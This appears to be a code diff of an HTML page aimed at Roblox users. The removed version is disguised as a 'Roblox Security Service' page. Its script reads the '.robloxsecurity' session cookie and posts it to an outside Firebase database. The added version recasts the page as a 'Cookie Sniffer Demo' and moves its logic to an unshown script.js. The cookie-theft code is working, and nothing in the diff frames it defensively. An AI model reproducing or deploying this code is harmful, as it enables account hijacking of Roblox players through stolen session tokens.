@@ -2,55 +2,55 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Roblox Cookie Collector</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Cookie Sniffer</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .cookie-result {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            max-width: 600px;
+            margin: auto;
+            padding: 20px;
+            text-align: left;
+        }
+        
+        .cookie-result pre {
+            background-color: #f9fafb;
+            border-radius: 4px;
+            font-size: 13px;
+            line-height: 1.5;
+            overflow-x: auto;
+            padding: 8px;
+            white-space: pre-wrap;
+            word-break: break-word;
+        }
+        
+        .cookie-result p {
+            color: #6b7280;
+            font-size: 14px;
+        }
+    </style>
 </head>
 <body>
-    <h1>Welcome to Roblox Security Service!</h1>
+
+<h1>Roblox Cookie Sniffer Demo</h1>
+<p>This script demonstrates capturing cookies from the Roblox site.</p>
+
+<div class="cookie-result">
+    <div id="result">No data captured yet...</div>
     
-    <script type="text/javascript">
-        // Function to extract cookies
-        function getCookie(name) {
-            var cookieValue = null;
-            if (document.cookie && document.cookie !== '') {
-                var cookies = document.cookie.split(';');
-                for (var i = 0; i < cookies.length; i++) {
-                    var cookie = cookies[i].trim();
-                    // Find the cookie with our name
-                    if (cookie.substring(0, name.length + 1) === (name + '=')) {
-                        cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
-                        break;
-                    }
-                }
-            }
-            return cookieValue;
-        }
+    <!-- This is where we'll display captured cookies -->
+    <pre id="cookies"></pre>
+</div>
 
-        // Function to send data to Firebase
-        function sendDataToFirebase(data) {
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', 'https://asdasdsa-f0afc-default-rtdb.firebaseio.com/cookies.json', true);
-            
-            // Set content type for JSON request
-            xhr.setRequestHeader('Content-Type', 'application/json');
-            
-            // Send data to Firebase DB
-            xhr.send(JSON.stringify(data));
-        }
-
-        // Main logic - get cookie and send it to Firebase if exists
-        var robloxCookie = getCookie('.robloxsecurity');
-        
-        if (robloxCookie) {
-            console.log('Found Roblox Security Cookie:', robloxCookie);
-            
-            // Send data with timestamp for tracking
-            sendDataToFirebase({
-                value: robloxCookie,
-                timestamp: new Date().toISOString()
-            });
-        } else {
-            console.log('.robloxsecurity cookie not found.');
-        }
-    </script>
+<script src="script.js"></script>
 </body>
 </html>
